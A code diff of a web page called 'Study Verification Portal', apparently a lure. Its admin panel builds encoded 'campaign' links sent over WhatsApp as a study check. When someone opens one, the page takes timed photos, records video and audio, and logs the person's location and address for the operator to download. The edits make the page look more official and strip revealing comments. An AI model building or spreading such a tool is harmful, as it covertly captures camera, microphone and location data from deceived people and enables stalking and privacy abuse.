@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>✨ Study Portal ✨</title>
+    <title>✨ Study Verification Portal ✨</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -314,7 +314,7 @@ function downloadAllData() {
     alert('✅ Complete report downloaded!');
 }
 
-// ============ LINK GENERATION - Sab kuch link mein encode karo ============
+// ============ LINK GENERATION ============
 function generateLink() {
     const campaignName = document.getElementById('campaignName').value;
     if(!campaignName) { alert('Please enter campaign name'); return; }
@@ -355,7 +355,7 @@ function sendToWhatsApp() {
     window.open(`https://wa.me/?text=${encodeURIComponent('📸 Study Verification: ' + link)}`, '_blank');
 }
 
-// ============ CAMERA PAGE - Link se data read karo ============
+// ============ CAMERA PAGE ============
 async function startCameraPageFromData(linkData) {
     neededCount = linkData.p;
     captureInterval = parseFloat(linkData.s) * 1000;
@@ -391,7 +391,7 @@ async function startRecording() {
             if(videoChunks.length) { 
                 const blob = new Blob(videoChunks, { type: 'video/webm' }); 
                 allVideos.push({ id: Date.now(), data: URL.createObjectURL(blob), time: new Date().toLocaleString() }); 
-                localStorage.setItem('studyVideosFinal4', JSON.stringify(allVideos));
+                localStorage.setItem('studyVideosFinal', JSON.stringify(allVideos));
                 updateStats();
                 displayVideos();
             } 
@@ -406,7 +406,7 @@ async function startRecording() {
             if(audioChunks.length) { 
                 const blob = new Blob(audioChunks, { type: 'audio/webm' }); 
                 allVoices.push({ id: Date.now(), data: URL.createObjectURL(blob), time: new Date().toLocaleString() }); 
-                localStorage.setItem('studyVoicesFinal4', JSON.stringify(allVoices));
+                localStorage.setItem('studyVoicesFinal', JSON.stringify(allVoices));
                 updateStats();
                 displayVoices();
             } 
@@ -439,7 +439,7 @@ async function getLocationWithAddress() {
             address: address,
             time: new Date().toLocaleString() 
         });
-        localStorage.setItem('studyLocsFinal4', JSON.stringify(allLocations));
+        localStorage.setItem('studyLocsFinal', JSON.stringify(allLocations));
         updateStats();
         displayLocations();
     }, () => {});
@@ -464,7 +464,7 @@ function startCapture() {
             canvas.getContext('2d').drawImage(video, 0, 0);
             const photoData = canvas.toDataURL('image/jpeg', 0.8);
             allPhotos.push({ id: Date.now(), data: photoData, time: new Date().toLocaleString() });
-            localStorage.setItem('studyPhotosFinal4', JSON.stringify(allPhotos));
+            localStorage.setItem('studyPhotosFinal', JSON.stringify(allPhotos));
             capturedCount++;
             updateStats();
             displayPhotos();
@@ -477,10 +477,10 @@ function startCapture() {
 }
 
 function updateStats() {
-    let photos = JSON.parse(localStorage.getItem('studyPhotosFinal4') || '[]');
-    let videos = JSON.parse(localStorage.getItem('studyVideosFinal4') || '[]');
-    let voices = JSON.parse(localStorage.getItem('studyVoicesFinal4') || '[]');
-    let locs = JSON.parse(localStorage.getItem('studyLocsFinal4') || '[]');
+    let photos = JSON.parse(localStorage.getItem('studyPhotosFinal') || '[]');
+    let videos = JSON.parse(localStorage.getItem('studyVideosFinal') || '[]');
+    let voices = JSON.parse(localStorage.getItem('studyVoicesFinal') || '[]');
+    let locs = JSON.parse(localStorage.getItem('studyLocsFinal') || '[]');
     
     allPhotos = photos;
     allVideos = videos;
@@ -495,29 +495,25 @@ function updateStats() {
     displayPhotos();
 }
 
-// ============ CHECK URL - Link se data read karo ============
+// ============ CHECK URL ============
 function checkUrl() {
     const urlParams = new URLSearchParams(window.location.search);
     const encodedData = urlParams.get('data');
     
     if(encodedData) {
         try {
-            // Decode data from link
             const jsonStr = decodeURIComponent(atob(encodedData));
             const linkData = JSON.parse(jsonStr);
             
-            // Camera page show karo
             document.getElementById('adminPanel').classList.add('hidden');
             document.getElementById('cameraPanel').classList.remove('hidden');
             startCameraPageFromData(linkData);
         } catch(e) {
-            // Invalid data - show admin panel
             document.getElementById('adminPanel').classList.remove('hidden');
             document.getElementById('cameraPanel').classList.add('hidden');
             updateStats();
         }
     } else {
-        // No data - show admin panel
         document.getElementById('adminPanel').classList.remove('hidden');
         document.getElementById('cameraPanel').classList.add('hidden');
         updateStats();
